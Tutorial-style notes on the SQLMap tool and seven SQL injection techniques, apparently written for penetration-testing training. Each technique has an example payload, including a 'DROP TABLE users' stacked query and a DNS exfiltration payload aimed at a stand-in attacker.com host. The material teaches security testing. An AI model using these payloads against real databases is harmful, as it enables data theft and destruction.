# SQLMap Overview

## Introduction

**SQLMap** is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting **SQL Injection (SQLi)** vulnerabilities.

The project has been actively maintained since **2006** and remains one of the most widely used SQL injection exploitation frameworks in penetration testing.

Basic usage:

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

Example output:

```text
[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'
```

SQLMap automatically performs:

- Connection testing
- WAF/IDS detection
- Parameter analysis
- SQL injection detection
- Database fingerprinting
- Exploitation

---

# Core Capabilities

SQLMap provides extensive automation for:

| Feature | Description |
|----------|-------------|
| Target Connection | Connects to vulnerable targets |
| Injection Detection | Detects SQL injection vulnerabilities |
| Fingerprinting | Identifies DBMS type and version |
| Enumeration | Extracts databases, tables, users, etc. |
| Optimization | Speeds up exploitation |
| WAF/IDS Bypass | Uses tamper scripts to evade protections |
| Data Extraction | Retrieves database contents |
| File System Access | Reads and writes files on the server |
| OS Command Execution | Executes operating system commands when possible |

# 1. Boolean-Based Blind SQL Injection

### Example Payload

```sql
AND 1=1
```

### Concept

Boolean-based SQL injection relies on the difference between:

```text
TRUE responses
FALSE responses
```

The attacker asks true/false questions and observes changes in the application's response.

---

### TRUE Condition

```sql
AND 1=1
```

Response remains normal.

---

### FALSE Condition

```sql
AND 1=2
```

Response changes significantly.

---

### Characteristics

- Most common SQLi type
- Works even when no errors are displayed
- SQLMap compares:
  - Page content
  - HTTP status codes
  - Response length
  - Titles
  - Text differences

---

### Speed

Approximately:

```text
7-8 requests per extracted character
```

---

# 2. Error-Based SQL Injection

### Example Payload

```sql
AND GTID_SUBSET(@@version,0)
```

### Concept

Uses database error messages to leak information.

Instead of guessing data one bit at a time, SQLMap forces the DBMS to generate errors that contain useful information.

---

### Supported Databases

| DBMS |
|--------|
| MySQL |
| PostgreSQL |
| Oracle |
| MSSQL |
| Sybase |
| Vertica |
| IBM DB2 |
| Firebird |
| MonetDB |

---

### Advantages

- Faster than blind techniques
- Can retrieve large chunks of data

Example:

```text
~200 bytes per request
```

---

# 3. UNION-Based SQL Injection

### Example Payload

```sql
UNION ALL SELECT 1,@@version,3
```

### Concept

Extends the original query and displays attacker-controlled results directly in the page.

Example:

Original query:

```sql
SELECT name,price FROM products WHERE id=1
```

Injected query:

```sql
UNION SELECT 1,@@version,3
```

---

### Advantages

- Fastest SQLi technique
- Directly retrieves data
- Entire tables may be dumped with very few requests

---

# 4. Stacked Queries

### Example Payload

```sql
; DROP TABLE users
```

### Concept

Executes multiple SQL statements within a single request.

Example:

```sql
SELECT * FROM users;
DROP TABLE users;
```

---

### Common Uses

- INSERT
- UPDATE
- DELETE
- EXEC
- Stored Procedures

---

### Supported Databases

Typically:

```text
MSSQL
PostgreSQL
```

---

### Why SQLMap Uses It

Advanced features:

- File uploads
- Command execution
- Registry interaction
- Privilege escalation

---

# 5. Time-Based Blind SQL Injection

### Example Payload

```sql
AND IF(2>1,SLEEP(5),0)
```

### Concept

Uses response time differences instead of page content.

---

### TRUE Condition

```sql
AND IF(1=1,SLEEP(5),0)
```

Response delayed:

```text
5 seconds
```

---

### FALSE Condition

```sql
AND IF(1=2,SLEEP(5),0)
```

Response returns immediately.

---

### Characteristics

- Very reliable
- Works when no output is visible
- Slower than Boolean-based attacks

---

### Usage Scenarios

Useful when:

- INSERT queries
- UPDATE queries
- DELETE queries

do not return visible content.

---

# 6. Inline Queries

### Example Payload

```sql
SELECT (SELECT @@version)
```

### Concept

Injects a query directly inside another query.

Example:

```sql
SELECT name,
       (SELECT @@version)
FROM users
```

---

### Characteristics

- Rarely encountered
- Requires specific application logic
- Fully supported by SQLMap

---

# 7. Out-of-Band SQL Injection (OOB)

### Example Payload

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

### Concept

Uses external communication channels to extract data.

Most commonly:

```text
DNS
```

---

### DNS Exfiltration Workflow

Target executes:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Database server attempts:

```text
8.0.39.attacker.com
```

DNS request sent:

```text
8.0.39.attacker.com
```

Attacker-controlled DNS server receives:

```text
8.0.39
```

which contains the extracted data.

---

### Advantages

Useful when:

- UNION attacks fail
- Error messages disabled
- Blind extraction too slow

---

### Characteristics

| Feature | Value |
|----------|--------|
| Stealth | High |
| Complexity | High |
| Speed | Faster than Blind |
| Infrastructure Required | Attacker-controlled DNS server |
